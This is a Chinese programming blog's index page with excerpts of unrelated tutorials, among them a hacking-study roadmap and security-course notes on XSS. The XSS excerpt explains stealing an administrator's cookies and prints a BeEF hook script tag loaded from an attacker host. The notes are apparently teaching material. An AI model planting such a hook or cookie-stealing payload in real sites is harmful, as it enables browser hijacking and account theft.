<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0c664b2c8f7eb7e51ea179b8f9abbc0/" rel="bookmark">
			文献速递：生成对抗网络医学影像中的应用——基于CycleGAN的图像到图像转换，用于逼真的外科手术训练模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文献速递：生成对抗网络医学影像中的应用——基于CycleGAN的图像到图像转换，用于逼真的外科手术训练模型 本周给大家分享文献的主题是生成对抗网络（Generative adversarial networks, GANs）在医学影像中的应用。文献的研究内容包括同模态影像生成、跨模态影像生成、GAN在分类和分割方面的应用等。生成对抗网络与其他方法相比展示出了优越的数据生成能力，使它们在医学图像应用中广受欢迎。这些特性引起了医学成像领域研究人员的浓厚兴趣，导致这些技术在各种传统和新颖应用中迅速实施，如图像重建、分割、检测、分类和跨模态合成。
01
文献速递介绍
外科手术训练对于发展技能和灵巧性至关重要。为了获得必要的经验，外科医生需要数千小时的实践。在内窥镜微创手术中，任务更加具有挑战性。为了避免仅与真实病人进行训练，外科医生通常在离体器官、虚拟模拟器或物理训练幻影上发展他们的技能。物理训练幻影为缝合和使用真实仪器操作提供了出色的触觉反馈和组织特性，并且易于获得。此外，它们可以为特定病人解剖定制，并为期望的程序进行优化 。在不同的范围内，外科训练幻影甚至可以用于开发额外的外科应用，如自动外科阶段识别。然而，它们缺乏生命力和不现实的外观，并不反映外科场景的复杂环境 。正如 Engelhardt 等人 所提出的，超现实主义是一种新的增强现实范式，旨在通过将手术过程中的域内模式映射到在这些外科模拟器训练期间捕获的视频流上，解决物理幻影中缺乏现实感的问题。通过生成模型，可以实现从一幅图像到另一幅图像的特征映射。这些生成模型存在不同的方法和概念，即应用变分自编码器（VAE）或生成对抗网络（GANs）。近年来，GANs 在图像合成和图像到图像转换 (I2I) 方面表现出了巨大的潜力 。
最近，已经开发了具有不同架构的几种 GAN 模型，这些架构高度依赖于用作输入的信息类型。对于这种每个域的图像都是未配对的特定域适应任务，CycleGAN 模型已显示出有希望的结果。 本工作的目标是从未配对的合成训练幻影图像生成逼真的二尖瓣术中图像。我们旨在使用 CycleGAN 生成模型实现成功的 I2I 转换，并进行以下实验：
研究最合适的训练损失函数；建立训练和图像质量度量标准，以实现客观和定量的结果评估；评估输入变异性对模型性能的影响。 Title
题目
CycleGAN-Based Image to Image Translation for Realistic SurgicalTraining Phantoms
基于CycleGAN的图像到图像转换，用于逼真的外科手术训练模型
Abstract
摘要
Training in surgery is essential for surgeons to develop skill and dexterity. Physical training phantoms provide excellent haptic feedback and tissue properties for stitching and operating with authentic instruments and are easily available.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0c664b2c8f7eb7e51ea179b8f9abbc0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f43c7adbb9d3b97650fb2318577d322/" rel="bookmark">
			STM32 基础知识（探索者开发板）--93讲 PWM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		预分频器相当于一个计数器，2分频就是接收2个脉冲传递一个脉冲，3分频就是接收3个脉冲传递一个脉冲，最高65535分频，那么总计时间能达到65535*65535*1/72MHZ 约59秒，没有分频器只能计数最高0.09秒
PWM配置步骤 1.配置定时器基础工作参数 HAL_TIM_PWM_Init(TIM_HandleTypeDef *htim)
2.定时器PWM输出Msp初始化 HAL_TIM_PWM_MspInit()
3.配置PWM模式/比较值等 HAL_TIM_PWM_ConfigChannel()
4.使能输出并启动计数器 HAL_TIM_PWM_Start()
5.修改比较值控制占空比 __HAL_TIM_SET_COMPARE()
解释步骤1中TIM_HandleTypeDef
typedef struct
{
TIM_TypeDef *Instance; /* 外设寄存器基地址 */
TIM_Base_InitTypeDef Init; /* 定时器初始化结构体*/
}TIM_HandleTypeDef;
再解释其中Init
typedef struct
{
uint32_t Prescaler; /* 预分频系数 */ uint32_t CounterMode; /* 计数模式 */
uint32_t Period; /* 自动重载值 ARR */
uint32_t ClockDivision; /* 时钟分频因子 */ uint32_t RepetitionCounter; /* 重复计数器 */
uint32_t AutoReloadPreload; /* 自动重载预装载使能 */
} TIM_Base_InitTypeDef;
解释步骤3中
HAL_StatusTypeDef HAL_TIM_PWM_ConfigChannel(TIM_HandleTypeDef *htim,
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f43c7adbb9d3b97650fb2318577d322/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f2ee4122bb43de4a44a89e92628f814/" rel="bookmark">
			Java项目-瑞吉外卖项目优化Day3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前后端分离开发 Yapi 是一个接口结合了接口测试、接口管理的管理平台，需要配置比较麻烦。看弹幕说用apifox更好用。可以将接口文档导出导入。
Swagger 注意下面的地址前面要有/。
效果：
可以在这里实现接口的测试，也可以导出文档等等。一般swagger是项目完成后进行测试使用，而前面的yapi是在开发之前定义接口并进行管理使用。
为类、方法、属性、参数增加注解。
项目部署 部署前端项目 前端怎么打包没讲，应该是用webpack。
分析，去除前端请求路径中的/api,并将请求交付给192.168.181.101:8080端口处理。
使用nginx启动前端，效果如下：
点击登录发送请求，发现接口多了个/api。猜测是更改了前端代码，在路径中加入了个api。
部署后端项目 没有的软件，直接yum install 软件名 -y。
克隆远程代码时，想指定分支使用-b 分支名。
在linux打包很慢，可能是要下载相关的jar包并且没有配置国内镜像。也可以在idea中打包，再将jar包传入linux虚拟机中。
启动成功，成功登录
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cce0db7863ae281189915695564db83/" rel="bookmark">
			Kali主题更换教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装插件 sudo apt-get install gnome-tweaks 如果报错
执行
apt-get update 再安装一次，即可
皮肤主题下载 开源的linux桌面皮肤下载站：
http://gnome-look.org/
进入gtk 3.x这一栏
解压皮肤包 如果下载的是zip压缩包
解压指令如
unzip snow-master.zip 读取文件，复制到系统下
cp -r snow-master /usr/share/themes #snow-master 解压出来的文件夹名 启用主题 左上角打程序，搜索外观
切换，我用的是这个snow-master,可以看到已经启用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f3f97c9ad444e1d1034e03071405350/" rel="bookmark">
			在树状数组总，找到某个field字段为value值的某个对象节点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在树状数组总，找到某个field字段为value值的某个对象节点，使用递归
export const findTreeItemBy = ( nodes: Array&lt;any&gt;, value: any, fieldMap: { value: string; children: string } = { value: "id", children: "children" }, ) =&gt; { if (!Array.isArray(nodes)) return for (const node of nodes) { if (node[fieldMap.value] == value) { return node } if (node[fieldMap.children] &amp;&amp; node[fieldMap.children].length) { const res = findTreeItemBy(node[fieldMap.children], value, { value: fieldMap.value, children: fieldMap.children, }) if (res) return res } } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac8d49c596bd3d078278b630df49a10f/" rel="bookmark">
			黑客（网络安全）技术速成自学
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.网络安全是什么 网络安全可以基于攻击和防御视角来分类，我们经常听到的 “红队”、“渗透测试” 等就是研究攻击技术，而“蓝队”、“安全运营”、“安全运维”则研究防御技术。
2.网络安全市场 一、是市场需求量高；
二、则是发展相对成熟入门比较容易。
3.所需要的技术水平 需要掌握的知识点偏多（举例）：
4.国家政策环境 对于国家与企业的地位愈发重要，没有网络安全就没有国家安全
更有为国效力的正义黑客—红客联盟
可见其重视程度。
5.网络安全学习路线 网络安全（黑客技术）学习路线图
需要高清pdf可以留言
第一阶段：安全基础 网络安全行业与法规
Linux操作系统
计算机网络
HTML PHP Mysql Python基础到实战掌握
第二阶段：信息收集 IP信息收集
域名信息收集
服务器信息收集
Web网站信息收集
Google hacking
Fofa网络安全测绘
第三阶段：Web安全 SQL注入漏洞
XSS
CSRF漏洞
文件上传漏洞
文件包含漏洞
SSRF漏洞
XXE漏洞
远程代码执行漏洞
密码暴力破解与防御
中间件解析漏洞
反序列化漏洞
第四阶段：渗透工具 MSF
Cobalt strike
Burp suite
Nessus Appscea AWVS
Goby XRay
Sqlmap
Nmap
Kali
第五阶段：实战挖洞 漏洞挖掘技巧
Src
Cnvd
众测项目
热门CVE漏洞复现
靶场实战
学习框架已经整理完毕，现在就差资料资源了，我这里整理了所有知识点对应的资料资源文档。
需要的朋友可以点赞收藏关注留言“已关注，求分享”，注意后台消息就行
1.全知识点视频教程
2.全工具包
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac8d49c596bd3d078278b630df49a10f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1dc84787464ac5f7932f38324a10dc0d/" rel="bookmark">
			前端基础vue路由懒加载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么用路由懒加载 首屏组件加载速度更快一些，解决白屏问题，常言道需要就加载，不需要就先放一边
懒加载定义 懒加载简单来说就是延迟加载或按需加载，即在需要的时候的时候进行加载。
使用 常用的懒加载方式有两种：即使用vue异步组件 和 ES中的import（及require.ensure）
1、未用懒加载，vue中路由代码如下 import Vue from 'vue' import Router from 'vue-router' import HelloWorld from '@/components/HelloWorld' Vue.use(Router) export default new Router({ mode：'hash' routes: [ { path: '/', name: 'HelloWorld', component:HelloWorld } ] }) 备注：mode是传参模式，用hash有#，# 就是 hash符号，中文名为哈希符或者锚点，在 hash 符号后的值称为 hash 值。另外有一个history是没有的
路由的 hash 模式是利用了 window 可以监听 onhashchange 事件来实现的，也就是说 hash 值是用来指导浏览器动作的，对服务器没有影响，HTTP 请求中也不会包括 hash 值，同时每一次改变 hash 值，都会在浏览器的访问历史中增加一个记录，使用“后退”按钮，就可以回到上一个位置。所以，hash 模式 是根据 hash 值来发生改变，根据不同的值，渲染指定DOM位置的不同数据。
2、vue异步组件实现懒加载 方法如下：component：resolve=&gt;(require(['需要加载的路由的地址'])，resolve)
import Vue from 'vue' import Router from 'vue-router' /* 此处省去之前导入的HelloWorld模块 */ Vue.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1dc84787464ac5f7932f38324a10dc0d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff80a74ef9cff6616c93cbf02c719a50/" rel="bookmark">
			wps如何把文字设置编号为二级1.1？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		两部操作
选中文字-选择多级编号中的1.
选中文字-更改编号级别-选择想要的级别1.1
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99d88c9323698b26d77ad28122823cec/" rel="bookmark">
			vue高级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.说说vue动态权限绑定渲染列表（权限列表渲染）
2.vue用的那种设计模式
3.说说vue操作真实dom性能
4.vue如何获取dom,操作dom,更新dom
5.vue的双向数据绑定原理是什么
6.谈谈vue的token存储
7.知道nextTick的作用吗，谈谈对它的理解，是什么，怎么用页面跳转传参
8.nextTick和setTimeout区别
9.谈谈如何实现vue组件通信和传值方式（两个问题为同一个答案问法不一样）过滤器哪里使用的，怎么用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/519d8c2bdf47efabf3ffa125ad37c566/" rel="bookmark">
			PPOCRLabel添加新的BBOX报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TypeError: arguments did not match any overloaded call:
drawRect(self, rect: QRectF): argument 1 has unexpected type 'float' drawRect(self, x: int, y: int, w: int, h: int): argument 1 has unexpected type 'float' drawRect(self, r: QRect): argument 1 has unexpected type 'float' # p.drawRect(leftTop.x(), leftTop.y(), rectWidth, rectHeight) p.drawRect(int(leftTop.x()), int(leftTop.y()), int(rectWidth), int(rectHeight)) Traceback (most recent call last): File "/home/chenxiyuan/miniconda3/envs/diamondforce/lib/python3.10/site-packages/PPOCRLabel/PPOCRLabel.py", line 1425, in scrollRequest bar.setValue(bar.value() + bar.singleStep() * units) TypeError: setValue(self, a0: int): argument 1 has unexpected type 'float' # bar.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/519d8c2bdf47efabf3ffa125ad37c566/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2a4a1cf8ab875641bad3e2877ac7554/" rel="bookmark">
			OpenTSDB使用总结-(4)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		订阅专栏
使用限制
系统中metric、tagk和tagv都有数量限制，每种最多可创建16777215个。
查询时延受查询条件和时间范围影响，如果存在聚合且数据量很多，则耗时也越长。
谨慎使用返回数据量非常大的查询，会造成查询时较长影响服务使用，从发起查询操作以直至返回结果期间，无法手工终止请求。
http请求的参数内容最大值为32M。
写入数据和查询数据时的时间戳建议使用4334400秒到4291718400秒之间的时间，即从1970/02/20 12:00:00到2106/01/01 00:00:00，否则可能导致查询结果不正确。
写入数据时，如果数据点的值为浮点数，目前只支持单精度的浮点数（Float）；查询数据时，如果数据点的值为浮点数，以双精度浮点数（Double）的方式显示，可根据需要转换为单精度或双精度浮点数。
API测试样例
请求样例
case 1
echo ; curl 'URL:4242/api/query' -d '
{
"start": xxxx,
"end": xxxx,
"queries": [
{
"aggregator": "sum",
"metric": "cpu.sys",
"filters": [
{
"type":"iteral_or",
"tagk":"device",
"filter":"device1",
"groupBy":false
}
]
}
]
}
';echo
样例解释：
URL:4242 - 默认使用的就是4242端口，URL是OpenTSDB的URL
这里采用了求和的方式，筛选device键值为device1的项目，以每个时间点cpu.sys值的方式进行返回。
case 2
echo ; curl 'URL:4242/api/query' -d '
{
"start": xxxx,
"end": xxxx,
"queries": [
{
"aggregator": "sum",
"metric": "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2a4a1cf8ab875641bad3e2877ac7554/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83584a258745373335300a8de9dd9bc1/" rel="bookmark">
			YB75XXH系列是采用CMOS工艺制造，低功耗的高压稳压器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		YB75xxH 高耐压线性稳压器
■产品简介：
YB75XXH系列是采用CMOS工艺制造，低功耗的高压稳压器，最高输入电压可达25V,输出电压范围为1.5V一12.0V。它具有高精度的输出电压、极低的供电电流、极低的跌落电压等特点。
■产品特点：
低功耗：≤3μA
低跌落电压：典型值0.1V
低温源：典型值50ppm/℃
高的输入电压：最高可达25V
高精度的输出电压：容差为+3%
封装形式：S0T89-3、S0T23-3、T0-92
■产品用途：
●电池等电源的供电设备
●各种通信设备
●音频/视频设备
●安防监控设备
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b335d8a6877bc5057955277c379f65cd/" rel="bookmark">
			Mac[M1]安装mongodb
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要在Mac（M1芯片）上安装MongoDB，可以按照以下步骤进行操作：
打开终端：你可以在“应用程序”文件夹中找到“终端”应用程序，或者使用Spotlight搜索并打开它。安装Homebrew：在终端中运行以下命令安装Homebrew，它是一个流行的包管理器，用于在Mac上安装软件包。 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
安装MongoDB：在终端中运行以下命令使用Homebrew安装MongoDB。 arch -x86_64 brew install mongodb-community
该命令使用arch -x86_64前缀以在M1芯片上模拟x86_64架构，以确保与MongoDB的二进制兼容性。
创建数据库目录：运行以下命令创建一个用于存储MongoDB数据库文件的目录。 sudo mkdir -p /System/Volumes/Data/data/db
这将在/System/Volumes/Data/data/db路径下创建一个目录。你可以根据需要更改目录的位置和名称。
设置数据库目录权限：运行以下命令更改数据库目录的权限。 sudo chown -R `id -un` /System/Volumes/Data/data/db
这将将数据库目录的所有权赋予当前用户。
启动MongoDB：运行以下命令以启动MongoDB服务器。 arch -x86_64 brew services start mongodb-community
现在，MongoDB服务器已成功启动。
你可以使用MongoDB的命令行工具（mongo）或第三方的MongoDB客户端连接到服务器，并开始使用MongoDB数据库。
请注意，这只是在M1芯片的Mac上安装MongoDB的一种方法。根据你的需求和环境，可能还有其他安装方法可用。确保在安装过程中按照官方文档或相关资源提供的指南进行操作，以获取最新的安装说明和适用于你的系统的特定步骤。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b34ef9fded3c842b4cc4a3f73a0f6fd8/" rel="bookmark">
			【IDEA】Idea pull 项目报错，提示 has no tracked branch
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 Idea pull 项目报错，提示 `has no tracked branch`执行如下命令再重新pull就好了 Idea pull 项目报错，提示 has no tracked branch 因为经常本地vpn切换，导致本地分支信息丢失，后续pull是校验失败可能是因为远程仓库和本地仓库起始不一致导致的问题 执行如下命令 # 查看当前分支信息 git branch # 远程地址和本地地址进行关联 git pull origin release-1120-stone --allow-unrelated-histories # 打印如下结果 From http://gitlab.oa.com/ka/ka-open * branch release-1120-stone -&gt; FETCH_HEAD * [new branch] release-1120-stone -&gt; origin/release-1120-stone Already up to date. 再重新pull就好了 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5bfd376cc6d254e77683f1ff2b9f4cf/" rel="bookmark">
			Postman创建及删除workspace工作空间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、Postman创建workspace工作空间二、Postman删除workspace工作空间 一、Postman创建workspace工作空间 打开Postman
点击 Workspaces → Create Workspaces
如图所示操作
工作空间创建完成
二、Postman删除workspace工作空间 点击 Workspaces → 选择要删除的工作空间
点击 Workspaces Settings
点击 Delete Workspaces
点击 Delete Workspaces
删除成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea3c793c4b51283627236a17c970216c/" rel="bookmark">
			【小迪安全】红蓝对抗 | 网络攻防 | V2022全栈培训笔记（WEB攻防35-40-XSS、CSRF、SSRF）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第35天 WEB攻防-通用漏洞&amp;XSS跨站&amp;反射&amp;存储&amp;DOM&amp;盲打&amp;劫持 知识点： 1、XSS跨站-原理&amp;攻击&amp;分类等
2、XSS跨站-反射型&amp;存储型&amp;DOM型等
3、XSS跨站攻击手法&amp;劫持&amp;恣取凭据等
4、XSS跨站-攻击项目&amp;XSS平台&amp;Beef-XSS
1、原理
指改击者利用网程序对用户输入过不足，端入可以量示在页面上对其他用尸道成影响的HTML代码，从而盗取用户资料、利用用户具份进行某种动或者对访问者进行病毒侵害的一种攻击方式，通过在用户端注入恶意的可执行脚本，若服务器时用户的第人不进行处理或处理不严，则浏览器就会夏接执行用户注入的脚本。
产生的地点：
数据文互的地方
get.post.headers
反馈与浏览
富文本编辑器
各类标签插入和自定义
数据输出的地方
用户资料
关键词、标签、说明
文件上传
2、分类
反射型（非持久型）
存储型（特久型）
DOM型
mXSS(突变型XSS)
UXSS(通用型XSs)
Flash XSS
UTF-7 XSS
MHTML XSS
CSS XSS
VBScript XSS
3、危害
网络钓鱼，包括获取各类用户账号：
窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；
劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；
强制弹出广告页面、刷流量等：
网页挂马；
进行恶意操作，如任意算改页面信息、别除文章等；
进行大量的客户端攻击，如ddos等；
获取客户端信息，如用户的浏览历史、真实即、开放端口等；
控制受害者机器向其他网站发起攻击；
结合其他漏洞，如cS什，实施进一步危害；
提升用户权限，包括进一步渗透网站；
传懂跨站却本螺虫等
#XSS跨站系列内容：
1加粗样式、XSS跨站-原理8分类8手法
2、XSS站-探针&amp;利用&amp;审计
3、XSS聘站-另类攻击手法利用
4、XSS跨站-防御修复8饶过策暗
演示案例： XSS跨站-原理&amp;分类&amp;手法&amp;探针
反射型实例-UA查询平台数据输出
思路：网站存在读取请求包中UA头并显示的功能–抓包修改UA头添加xss语句–xss语句执行
存储型实例-订单系统CMS权限获取
思路：留言板处会将输入保存到数据库中，后台管理员查看时会执行xss语句。此处xss语句可以替换为盗取cookie的语句，管理员执行后将管理员账号cookie发送到xss平台，从而盗取cookie。
DOM型实例-EmpireCMS前端页面审计
javascript:alter(1)这里不是传参，因此要改变写法
XSS利用环境-XSS平台&amp;Beef-XSS项目
搭建beef-xss平台后，若受害者访问 &lt;script src="http://192.168.1.105:3000/hook.js"&gt;&lt;/script&gt; 则会被劫持浏览器，可以获取受害者cookie、跳转网站、钓鱼等。
参考文章：https://blog.csdn.net/qq_53517370/article/details/128992559
第36天 WEB攻防-通用漏洞&amp;XSS跨站&amp;MXSS&amp;UXSS&amp;FlashXSS&amp;PDFXSS 知识点 mXSS(突变型XSS)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea3c793c4b51283627236a17c970216c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd9ccfa2d2ad18933e4a30b4691d7563/" rel="bookmark">
			前端基础location的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念 获取当前页面的地址信息，还可以修改某些属性，实现页面跳转和刷新等。
样例展示 window.location 含义.originURL 基础地址，包括协议名、域名和端口号.protocol协议 (http: 或 https:).host域名+端口号.hostname域名.port端口号.pathname路径(以/开头).search查询字符串，以?开头.hash页面锚点，以#开头.href完整 URL
比较容易混淆的是host和hostname这两个属性，区别是前者还包含了端口号。
修改属性值 以上属性除了origin是只读属性，其他都可以修改。修改后的效果就是跳转到相应的新地址。
属性一览表
方法一览表 .assign()导航到指定 URL.replace()导航到指定 URL并删除当前页面的访问记录.reload()重新加载当前页面.toString()返回 URL 字符串
.toString()和.href都是返回 URL，它们之间有区别吗？结果是一样的，性能上稍微有点差别。通过 JSPerf 上的性能测试结果可以看出，.href稍快，通过window.location拼接字符串的形式速度最慢。
.assign() 和直接修改href是等价的，那么它们跟.replace()的区别是什么呢？
.assign() 在跳转新地址的同时会留下当前页面的访问记录，点击浏览器返回按钮会回到原来的页面，.replace()则不会保留。
场景1：页面跳转锦集 location.href='https://www.baidu.com' window.open('http://www.baidu.com','_self') location.assign('http://www.baidu.com') location.replace('http://www.baidu.com') &lt;a href="https://www.baidu.com"&gt;跳转&lt;/a&gt; 页面中跳转固定的地址 function imitateClick(url){ let aEle = document.createElement("a"); aEle.setAttribute("href", url); aEle.setAttribute("target", "_blank"); aEle.setAttribute("id", "previewJumpEle"); // 防止重复添加 if (!document.getElementById("previewJumpEle")) { document.body.appendChild(aEle); } // 模拟点击 aEle.click(); (aEle.remove &amp;&amp; aEle.remove()) || (aEle.removeNode &amp;&amp; aEle.removeNode(true)); }; imitateClick('https://www.baidu.com'); js中直接做无感跳转，但是此方法有个弊端：经过验证，有的浏览器可能会拦截，慎用。 &lt;meta http-equiv="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd9ccfa2d2ad18933e4a30b4691d7563/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5d53a5fcf1db3f8a3f03e2715e75e93/" rel="bookmark">
			[每周一更]-(第38期)：Go常见的操作消息队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Go语言中，常见的消息队列有以下几种： RabbitMQ：RabbitMQ是一个开源的AMQP（高级消息队列协议）消息代理软件，用于支持多种编程语言，包括Go语言。RabbitMQ提供了可靠的消息传递机制和灵活的路由规则，可以用于处理大量的消息和任务。Apache Kafka：Apache Kafka是一个开源的分布式流处理平台，也可以用作消息队列，用于处理高容量的消息流和实时数据。Kafka提供了高吞吐量、低延迟的消息传递机制，并且具有良好的可伸缩性和可靠性。NSQ：NSQ是一个开源的实时分布式消息平台，用于处理大规模的消息和数据流。NSQ提供了高可靠性和低延迟的消息传递机制，并且具有良好的可扩展性和可伸缩性。NATS：NATS是一个轻量级、高性能的消息系统，用于支持分布式应用程序和微服务。NATS提供了简单易用的API和协议，具有高可靠性、低延迟和高吞吐量的消息传递机制。Redis：Redis是一个开源的内存数据库，也可以用作消息队列。Redis提供了支持发布订阅模式、阻塞队列等特性，可以用于处理实时数据和大量的消息。ActiveMQ：ActiveMQ是一个开源的消息代理软件，用于支持多种消息传递协议和编程语言。ActiveMQ提供了高可靠性、可伸缩性和可扩展性的消息传递机制，可以用于处理大规模的消息和任务。 除了以上常见的消息队列，还有一些其他的开源消息系统和组件，例如RocketMQ、ZeroMQ等，也可以用于处理消息和任务。
在选择消息队列时，需要根据具体的业务需求和性能要求进行选择，并且需要考虑安全性、可靠性和扩展性等因素，确保消息传递的可靠性和性能。
消息队列的使用场景有哪些？ 不同的消息队列适用于不同的场景，以下是常见的使用场景：
RabbitMQ：RabbitMQ适用于需要可靠的消息传递和灵活的路由规则的场景，例如电商网站的订单处理、银行的支付处理等。Apache Kafka：Kafka适用于处理大规模的消息和数据流，例如社交媒体的实时消息、大型网站的日志处理等。NSQ：NSQ适用于需要高可靠性和低延迟的场景，例如在线游戏的实时消息、金融交易的实时处理等。NATS：NATS适用于需要高可靠性、低延迟和高吞吐量的场景，例如移动互联网应用的实时通信、物联网设备的数据传输等。Redis：Redis适用于需要快速处理大量消息的场景，例如在线聊天、实时数据分析等。ActiveMQ：ActiveMQ适用于需要支持多种消息传递协议和编程语言的场景，例如企业应用集成、分布式系统的消息传递等。 当然，这些场景只是一些常见的示例，具体的使用场景还需要根据业务需求和性能要求来选择。需要根据消息队列的特性、优缺点和性能指标进行评估和比较，选择最适合自己业务需求的消息队列。
使用示例 操作RabbitMQ 我们有一个需求，需要向多个客户端发送消息，可以使用RabbitMQ作为消息队列，Go作为开发语言。
1、安装RabbitMQ并启动服务。
2、安装amqp库：
go get github.com/streadway/amqp 3、生产者向消息队列中发送消息：
package main import ( "fmt" "log" "github.com/streadway/amqp" ) func main() { // 连接RabbitMQ服务器 conn, err := amqp.Dial("amqp://guest:guest@localhost:5672/") if err != nil { log.Fatalf("Failed to connect to RabbitMQ: %s", err) } defer conn.Close() // 创建一个channel ch, err := conn.Channel() if err != nil { log.Fatalf("Failed to open a channel: %s", err) } defer ch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5d53a5fcf1db3f8a3f03e2715e75e93/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe9c61f7eb9cdeca2eae35e3b36c8b29/" rel="bookmark">
			软考高级难度排行榜，哪个科目相对较容易呢？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面对软考的5大高级科目，你是不是也想知道哪个科目相对较“容易”一些呢？今天，让我们一起来看看吧
软考高级科目岗位描述 首先，大家可以看一下官方发布的《计算机技术与软件专业技术资格(水平)考试岗位设置与岗位描述》中有关软考高级科目的岗位描述栏，然后再去做科目的选择。
信息系统项目管理师岗位描述：
从事信息系统项目管理的高级管理人员、高级项目经理等。
系统分析师岗位描述：
在信息系统项目开发过程中负责制定信息系统需求规格说明书和项目开发计划、指导和协调信息系统开发与运行、编写系统分析设计文档、对开发过程进行质量控制与进度控制等的高级技术人员。
系统架构设计师岗位描述：
从事系统架构分析、设计与评估的高级技术人员。
网络规划设计师岗位描述：
从事计算机网络领域的需求分析、规划设计、部署实施、评测、运行维护等工作，能指导制订用户的数据和网络战略规划，能指导网络工程师进行系统建设实施的高级技术人员。
系统规划与管理师岗位描述：
从事信息技术服务规划和信息系统运行维护管理，制定组织的IT服务标准和相关制度、管理IT服务团队的高级技术人员。
